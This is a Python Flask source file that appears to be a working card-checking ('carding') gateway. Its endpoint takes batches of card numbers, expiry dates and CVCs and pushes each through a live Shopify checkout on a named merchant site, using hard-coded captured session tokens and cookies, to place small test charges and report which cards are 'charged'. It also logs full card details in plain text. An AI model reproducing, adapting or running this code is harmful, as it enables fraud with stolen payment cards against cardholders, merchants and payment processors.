import json
import logging
import re
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from flask import Flask, request, jsonify
import requests
from urllib.parse import urlencode, unquote
import uuid

app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='shopify23$_debug.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Headers and cookies (based on provided scripts)
HEADERS = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.vanguardmil.com',
    'priority': 'u=1, i',
    'referer': 'https://www.vanguardmil.com/',
    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'x-checkout-one-session-token': 'AAEBQjASMCKIMMo0cQPwMGutxb4UE5o3USInziN-TxyMi3uSCWP2Vo_1AJXLpkdrvl7sjT_xQUBawyQNzcYt3p6APfGrRXhDioEuPZhTfEq3vuHElP8ajaKdkI-RstIS1DwqbcCRYHbgUyGb39lmYOgVoOmwcOUXofzCG3xAWLA6mVNj6vPYFvLFZ5lUI17-BOqPi4-uU_EbSdnkXNNON4_3GQ',
    'x-checkout-web-build-id': '1425498c9f082684649666eafda564f07561d25c',
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'yes',
    'x-checkout-web-source-id': 'hWN1DD0iR9Rfnqmheh7rVKMb',
}

COOKIES = {
    '_tracking_consent': '3.AMPS_INJK_f_f_JQ9CMYWERNiXUlK5BHUYAw',
    '_shopify_y': '87251844-b175-421a-b270-eabc935b3a4d',
    '_orig_referrer': '',
    '_landing_page': '%2Fcart%2F12379973845046%3A1%3Ftraffic_source%3Dbuy_now',
    'localization': 'US',
    'cart': 'hWN1DD0iR9Rfnqmheh7rVKMb%3Fkey%3D1a074e8d82d0b236ccd0c4a5165fa3fd',
    'cart_currency': 'USD',
    'skip_shop_pay': 'false',
    '_shopify_s': '62bf98dc-234b-4b4a-ae12-5a29d43eb2e8',
    'gsf_visitor_consent_flag': '{"analyticsProcessingAllowed":true,"marketingAllowed":true,"preferencesProcessingAllowed":true,"saleOfDataAllowed":true}',
    '_gcl_au': '1.1.1822293284.1753859150',
    '_ga': 'GA1.1.1079689097.1753859150',
    '_ga_X1B4FFJM4G': 'GS2.1.s1753859150$o1$g0$t1753859150$j60$l0$h0',
    '_shopify_essential': ':AZhaJqTTAAEAEjSlsqvYmpzN47HJNSb45vcSkA37lwG31qiiVMWD3pLwZLgTqoNgaH2sxN5kUMCG6gxnRZ0AwR1C8x1DI9RvpC_1uN2iGoKfTxAtPtKScaCOxVzmaaxy5mTZ8L3sIB5n-4r6Thbf4rQxAG7rCExx-5gXGti77n2cuwBIjSlwOgSyxY_XWOqtq7oOlKmRN7HwM5-2YYqdOiolq2l8hBueu8A2g3nwM8kVXqppXDOj93p2rQYSQ0cAcVGerg300QlqUtIX_RAyBlUwcTLL50GAaSx03732ovNIlvqCI9aTGUc3NmKi5XkGYbZS64QmDJFuQC5r_uI3A2QREQPbMy2FesLz22dSKUgRAQf_dM1Ms3rEK1RK4RP-yzTmfQ:',
    '_fbp': 'fb.1.1753859152833.774881131534444264',
    '_ga_G3RDTGKWR4': 'GS2.1.s1753859150$o1$g1$t1753859244$j60$l0$h0',
    '_ga_3DVY3EV05L': 'GS2.1.s1753859150$o1$g1$t1753859245$j60$l0$h0',
}

def validate_card(card_number, exp_month, exp_year, cvc):
    """Validate card details with support for YY/YYYY expiry formats."""
    # Sanitize inputs
    card_number = re.sub(r'[^0-9]', '', card_number)
    exp_month = re.sub(r'[^0-9]', '', str(exp_month))
    exp_year = re.sub(r'[^0-9]', '', str(exp_year))
    cvc = re.sub(r'[^0-9]', '', str(cvc))

    # Validate card number (13-19 digits)
    if not re.match(r'^\d{13,19}$', card_number):
        logging.error(f"Invalid card number format: {card_number}")
        return False, "Invalid card number format"

    # Validate month (01-12)
    exp_month = exp_month.zfill(2)
    if not re.match(r'^(0[1-9]|1[0-2])$', exp_month):
        logging.error(f"Invalid exp_month format: {exp_month}")
        return False, "Invalid exp_month format"

    # Normalize exp_year (YY or YYYY)
    current_year = datetime.now().year
    current_century = current_year - (current_year % 100)
    if len(exp_year) == 2:
        card_year = int(exp_year)
        exp_year = current_century + card_year if card_year >= (current_year % 100) else current_century + 100 + card_year
    elif len(exp_year) == 4:
        exp_year = int(exp_year)
    else:
        logging.error(f"Invalid exp_year format: {exp_year}")
        return False, "Invalid exp_year format - must be YY or YYYY"

    # Validate year (not expired, not too far in future)
    if not re.match(r'^\d{4}$', str(exp_year)) or exp_year > current_year + 10:
        logging.error(f"Invalid exp_year after normalization: {exp_year}")
        return False, "Invalid exp_year format or too far in future"

    # Validate logical expiry
    try:
        expiry_date = datetime.strptime(f"{exp_year}-{exp_month}-01", "%Y-%m-%d")
        current_date = datetime.strptime(f"{current_year}-{datetime.now().month}-01", "%Y-%m-%d")
        if expiry_date < current_date:
            logging.error(f"Card expired: {card_number}|{exp_month}|{exp_year}|{cvc}")
            return False, "Card expired"
    except ValueError:
        logging.error(f"Invalid expiry date: {exp_year}-{exp_month}")
        return False, "Invalid expiry date"

    # Validate CVC (3-4 digits)
    if not re.match(r'^\d{3,4}$', cvc):
        logging.error(f"Invalid CVC format: {cvc}")
        return False, "Invalid CVC format"

    return True, (card_number, exp_month, exp_year, cvc)

def process_card(card_details, retry=1):
    """Process a single card through Shopify APIs with retry logic."""
    try:
        card_number, exp_month, exp_year, cvc = card_details
        logging.info(f"Processing card: {card_number}|{exp_month}|{exp_year}|{cvc}")

        # Step 1: Create session
        session_data = {
            'credit_card': {
                'number': card_number,
                'month': int(exp_month),
                'year': int(exp_year),
                'verification_value': cvc,
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': 'Darkboy',
            },
            'payment_session_scope': 'vanguardmil.com',
        }
        headers_session = HEADERS.copy()
        headers_session['origin'] = 'https://checkout.pci.shopifyinc.com'
        headers_session['referer'] = 'https://checkout.pci.shopifyinc.com/build/102f5ed/number-ltr.html?identifier=&locationURL=&localFonts[]=%7B%22name%22%3A%22Lato%22%2C%22source%22%3A%22local(%27Lato%20Regular%27)%2C%20local(%27Lato-Regular%27)%2C%20url(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.c3b93d431f0091c8be23185e15c9d1fee1e971c5.woff2%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Dc95fc2c7a817392abba851cc430429100da8cbcd76b814750792c595b9789084)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.d5c00c781efb195594fd2fd4ad04f7882949e327.woff%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Ddfd4096831f7204e44b129f6061f17ee921f43021a25b23b3130d65d230953b6)%20format(%27woff%27)%22%7D&localFonts[]=%7B%22name%22%3A%22Lato%22%2C%22source%22%3A%22local(%27Lato%20Regular%27)%2C%20local(%27Lato-Regular%27)%2C%20url(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.c3b93d431f0091c8be23185e15c9d1fee1e971c5.woff2%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Dc95fc2c7a817392abba851cc430429100da8cbcd76b814750792c595b9789084)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.d5c00c781efb195594fd2fd4ad04f7882949e327.woff%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Ddfd4096831f7204e44b129f6061f17ee921f43021a25b23b3130d65d230953b6)%20format(%27woff%27)%22%7D'

        for attempt in range(retry + 1):
            try:
                response = requests.post('https://checkout.pci.shopifyinc.com/sessions',
                                       headers=headers_session, json=session_data, timeout=50)
                if response.status_code != 200:
                    logging.error(f"Session creation failed: HTTP {response.status_code}, Response: {response.text[:200]}")
                    if attempt < retry:
                        continue
                    return {"status": "declined", "message": f"Session creation failed: HTTP {response.status_code}"}

                session_result = response.json()
                if 'id' not in session_result:
                    logging.error(f"Invalid session response: {json.dumps(session_result)[:200]}")
                    return {"status": "declined", "message": "Invalid session response"}

                session_id = session_result['id']
                payment_method_identifier = session_result.get('payment_method_identifier', 'c0a70d7e63ffa84b8b32deb8d72a686f')
                logging.info(f"Session created: {session_id}")

                # Step 2: Submit for completion
                submit_data = {
                    'query': '''mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!, $metafields: [MetafieldInput!], $postPurchaseInquiryResult: PostPurchaseInquiryResultCode, $analytics: AnalyticsInput) {
                        submitForCompletion(input: $input, attemptToken: $attemptToken, metafields: $metafields, postPurchaseInquiryResult: $postPurchaseInquiryResult, analytics: $analytics) {
                            ... on SubmitSuccess { receipt { ...ReceiptDetails } }
                            ... on SubmitAlreadyAccepted { receipt { ...ReceiptDetails } }
                            ... on SubmitFailed { reason }
                            ... on SubmitRejected { errors { ... on NegotiationError { code localizedMessage } } }
                            ... on Throttled { pollAfter pollUrl queueToken }
                            ... on CheckpointDenied { redirectUrl }
                            ... on TooManyAttempts { redirectUrl }
                            ... on SubmittedForCompletion { receipt { ...ReceiptDetails } }
                        }
                    }
                    fragment ReceiptDetails on Receipt {
                        ... on ProcessedReceipt { id token paymentDetails { paymentCardBrand creditCardLastFourDigits paymentAmount { amount currencyCode } paymentGateway } }
                        ... on ProcessingReceipt { id pollDelay }
                        ... on WaitingReceipt { id pollDelay }
                        ... on ActionRequiredReceipt { id action { ... on CompletePaymentChallenge { url } } }
                        ... on FailedReceipt { id processingError { ... on PaymentFailed { code messageUntranslated } } }
                    }''',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': HEADERS['x-checkout-one-session-token']},
                            'queueToken': 'A0BuViNF5uWuojW64-m4dv3G7CbZ8SY9ekvTyHZLbEUgccVE8Hqv2x3N6_xX_gez1xCHNoNlHmMlGZz6Z0KiJvSEZb23F7EG3xsHLyBc-1x2A_My',
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'destination': {
                                        'streetAddress': {
                                            'address1': 'New York', 'address2': 'New York', 'city': 'New York',
                                            'countryCode': 'US', 'postalCode': '10200', 'firstName': 'Dark',
                                            'lastName': 'Boy', 'zoneCode': 'NY', 'phone': '9685698569', 'oneTimeUse': False
                                        }
                                    },
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyByHandle': {
                                            'handle': '84b346bc8248a38a15eb63cb0acbfaf5-637d968cc49b21b877b3f8441beae1e1',
                                            'customDeliveryRate': False
                                        },
                                        'options': {'phone': '9685698569'}
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': '34cdbe59-7c4a-4616-ae8f-b273b8b97e29'}]},
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'value': {'amount': '19.80', 'currencyCode': 'USD'}},
                                    'destinationChanged': False
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'supportsSplitShipping': True
                            },
                            'deliveryExpectations': {'deliveryExpectationLines': []},
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': '34cdbe59-7c4a-4616-ae8f-b273b8b97e29',
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': 'gid://shopify/ProductVariantMerchandise/12379973845046',
                                            'variantId': 'gid://shopify/ProductVariant/12379973845046',
                                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                        }
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'value': {'amount': '3.50', 'currencyCode': 'USD'}},
                                    'lineComponentsSource': None, 'lineComponents': []
                                }]
                            },
                            'memberships': {'memberships': []},
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_method_identifier,
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': 'New York', 'address2': 'New York', 'city': 'New York',
                                                    'countryCode': 'US', 'postalCode': '10200', 'firstName': 'Dark',
                                                    'lastName': 'Boy', 'zoneCode': 'NY', 'phone': '9685698569'
                                                }
                                            },
                                            'cardSource': None
                                        }
                                    },
                                    'amount': {'value': {'amount': '23.3', 'currencyCode': 'USD'}}
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': 'New York', 'address2': 'New York', 'city': 'New York',
                                        'countryCode': 'US', 'postalCode': '10200', 'firstName': 'Dark',
                                        'lastName': 'Boy', 'zoneCode': 'NY', 'phone': '9685698569'
                                    }
                                }
                            },
                            'buyerIdentity': {
                                'customer': {'presentmentCurrency': 'USD', 'countryCode': 'IN'},
                                'email': 'kjbksefb@gmail.com', 'emailChanged': False, 'phoneCountryCode': 'IN',
                                'marketingConsent': [], 'shopPayOptInPhone': {'number': '9685698569', 'countryCode': 'IN'},
                                'rememberMe': False
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
                            'optionalDuties': {'buyerRefusesDuties': False},
                            'cartMetafields': []
                        },
                        'attemptToken': f'hWN1DD0iR9Rfnqmheh7rVKMb-{str(uuid.uuid4())[:8]}',
                        'metafields': [{
                            'key': 'views', 'namespace': 'checkoutblocks',
                            'value': '{"blocks":["68701fd10734c931da8bd522","669808171ccb91cf0ee2a23c"]}',
                            'valueType': 'JSON_STRING', 'appId': 'gid://shopify/App/4748640257'
                        }],
                        'analytics': {
                            'requestUrl': 'https://www.vanguardmil.com/checkouts/cn/hWN1DD0iR9Rfnqmheh7rVKMb?cart_link_id=LT5dG7f5',
                            'pageId': '5a2703f8-ACE1-4B21-3F97-0BECB1D8D8C1'
                        }
                    }
                }
                response = requests.post('https://www.vanguardmil.com/checkouts/unstable/graphql',
                                       params={'operationName': 'SubmitForCompletion'},
                                       cookies=COOKIES, headers=HEADERS, json=submit_data, timeout=50)
                if response.status_code != 200:
                    logging.error(f"SubmitForCompletion failed: HTTP {response.status_code}, Response: {response.text[:200]}")
                    if attempt < retry:
                        continue
                    return {"status": "declined", "message": f"SubmitForCompletion failed: HTTP {response.status_code}"}

                submit_result = response.json()
                receipt_id = None
                if 'data' in submit_result and 'submitForCompletion' in submit_result['data']:
                    submit_data = submit_result['data']['submitForCompletion']
                    if 'receipt' in submit_data and submit_data['receipt'].get('id'):
                        receipt_id = submit_data['receipt']['id']
                    elif submit_data.get('reason'):
                        logging.error(f"SubmitForCompletion failed: {submit_data['reason']}")
                        return {"status": "declined", "message": submit_data['reason']}
                    elif submit_data.get('errors'):
                        error_msg = submit_data['errors'][0].get('localizedMessage', 'Unknown error')
                        logging.error(f"SubmitForCompletion rejected: {error_msg}")
                        return {"status": "declined", "message": error_msg}
                else:
                    logging.error(f"Invalid SubmitForCompletion response: {json.dumps(submit_result)[:200]}")
                    return {"status": "declined", "message": "Invalid SubmitForCompletion response"}

                if not receipt_id:
                    logging.error(f"No receipt ID in SubmitForCompletion response")
                    return {"status": "declined", "message": "No receipt ID returned"}

                # Step 3: Poll for receipt
                poll_data = {
                    'query': '''query PollForReceipt($receiptId: ID!, $sessionToken: String!) {
                        receipt(receiptId: $receiptId, sessionInput: {sessionToken: $sessionToken}) {
                            ... on ProcessedReceipt { id paymentDetails { paymentCardBrand creditCardLastFourDigits paymentAmount { amount currencyCode } paymentGateway } }
                            ... on ProcessingReceipt { id pollDelay }
                            ... on WaitingReceipt { id pollDelay }
                            ... on ActionRequiredReceipt { id action { ... on CompletePaymentChallenge { url } } }
                            ... on FailedReceipt { id processingError { ... on PaymentFailed { code messageUntranslated } } }
                        }
                    }''',
                    'variables': {
                        'receiptId': receipt_id,
                        'sessionToken': HEADERS['x-checkout-one-session-token']
                    },
                    'operationName': 'PollForReceipt'
                }
                response = requests.post('https://www.vanguardmil.com/checkouts/unstable/graphql',
                                       params={'operationName': 'PollForReceipt'},
                                       cookies=COOKIES, headers=HEADERS, json=poll_data, timeout=50)
                if response.status_code != 200:
                    logging.error(f"PollForReceipt failed: HTTP {response.status_code}, Response: {response.text[:200]}")
                    return {"status": "declined", "message": f"PollForReceipt failed: HTTP {response.status_code}"}

                poll_result = response.json()
                if 'data' in poll_result and 'receipt' in poll_result['data']:
                    receipt = poll_result['data']['receipt']
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        logging.info(f"Card charged successfully: {card_number}|{exp_month}|{exp_year}|{cvc}")
                        return {"status": "charged", "message": "Donation successful"}
                    elif receipt.get('__typename') == 'FailedReceipt' and 'processingError' in receipt:
                        error = receipt['processingError']
                        logging.error(f"Payment failed: {error.get('messageUntranslated', 'Unknown error')}")
                        return {"status": "declined", "message": error.get('messageUntranslated', 'Unknown error')}
                    else:
                        logging.error(f"Unexpected receipt type: {receipt.get('__typename')}")
                        return {"status": "declined", "message": f"Unexpected receipt type: {receipt.get('__typename')}"}
                else:
                    logging.error(f"Invalid PollForReceipt response: {json.dumps(poll_result)[:200]}")
                    return {"status": "declined", "message": "Invalid PollForReceipt response"}
            except requests.exceptions.RequestException as e:
                logging.error(f"Request error on attempt {attempt + 1}: {str(e)}")
                if attempt < retry:
                    continue
                return {"status": "declined", "message": f"Request failed: {str(e)}"}

        return {"status": "declined", "message": "Failed after retries"}
    except Exception as e:
        logging.error(f"Error processing card {card_details}: {str(e)}")
        return {"status": "declined", "message": f"Processing error: {str(e)}"}

@app.route('/gateway=shopify23$/cc=<card_details>', methods=['GET'])
def shopify23(card_details):
    """Handle Shopify23$ gateway endpoint for single or multiple cards."""
    try:
        # Decode card details from URL
        decoded_cc = unquote(card_details)
        cards = [card.strip() for card in decoded_cc.split('\n') if card.strip()]
        if not cards:
            logging.error("No card details provided")
            return jsonify({"status": "declined", "message": "No card details provided"})

        results = []
        if len(cards) == 1:
            # Single card processing
            card_parts = cards[0].split('|')
            if len(card_parts) != 4:
                logging.error(f"Invalid card format: {cards[0]}")
                return jsonify({"status": "declined", "message": "Invalid card format: number|month|year|cvc"})

            card_number, exp_month, exp_year, cvc = card_parts
            is_valid, result = validate_card(card_number, exp_month, exp_year, cvc)
            if not is_valid:
                return jsonify({"status": "declined", "message": result})

            result = process_card(result)
            result['card_details'] = f"{card_number}|{exp_month}|{exp_year}|{cvc}"
            return jsonify(result)
        else:
            # Multiple cards - process in parallel (up to 3 concurrently)
            validated_cards = []
            for card in cards:
                card_parts = card.split('|')
                if len(card_parts) != 4:
                    logging.error(f"Invalid card format: {card}")
                    results.append({"status": "declined", "message": "Invalid card format: number|month|year|cvc", "card_details": card})
                    continue
                card_number, exp_month, exp_year, cvc = card_parts
                is_valid, result = validate_card(card_number, exp_month, exp_year, cvc)
                if not is_valid:
                    results.append({"status": "declined", "message": result, "card_details": card})
                else:
                    validated_cards.append(result)

            # Process valid cards in parallel
            with ThreadPoolExecutor(max_workers=3) as executor:
                future_to_card = {executor.submit(process_card, card): card for card in validated_cards}
                for future in future_to_card:
                    card = future_to_card[future]
                    try:
                        result = future.result()
                        result['card_details'] = f"{card[0]}|{card[1]}|{card[2]}|{card[3]}"
                        results.append(result)
                    except Exception as e:
                        results.append({"status": "declined", "message": f"Processing error: {str(e)}", "card_details": f"{card[0]}|{card[1]}|{card[2]}|{card[3]}"})

            return jsonify(results)

    except Exception as e:
        logging.error(f"Server error: {str(e)}")
        return jsonify({"status": "declined", "message": f"Server error: {str(e)}"})

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
